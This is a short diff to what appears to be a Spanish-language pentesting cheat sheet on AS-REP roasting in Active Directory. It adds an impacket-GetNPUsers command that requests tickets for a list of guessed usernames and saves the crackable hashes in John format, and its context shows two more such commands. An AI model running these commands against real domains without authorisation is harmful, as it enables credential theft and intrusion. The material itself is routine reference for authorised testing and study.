@@ -5,6 +5,11 @@
 impacket-GetNPUsers <DOMAIN>/ -no-pass -usersfile <FILE-USERS>
 ```
 
+#### Ataque TGT usando un archivo de listado de posbles usuarios y guardar el resultado en formato John
+```
+impacket-GetNPUsers <DOMAIN>/ -dc-ip <IP> -format john -outputfile hashes.asreproast -no-pass -usersfile <FILE_USERS>
+```
+
 #### ASRepRoast Attack - con usuario y contraseña que tengamos
 ```
 impacket-GetNPUsers -dc-ip <IP> -request -outputfile ASREProastables.txt <DOMAIN>/<USER>
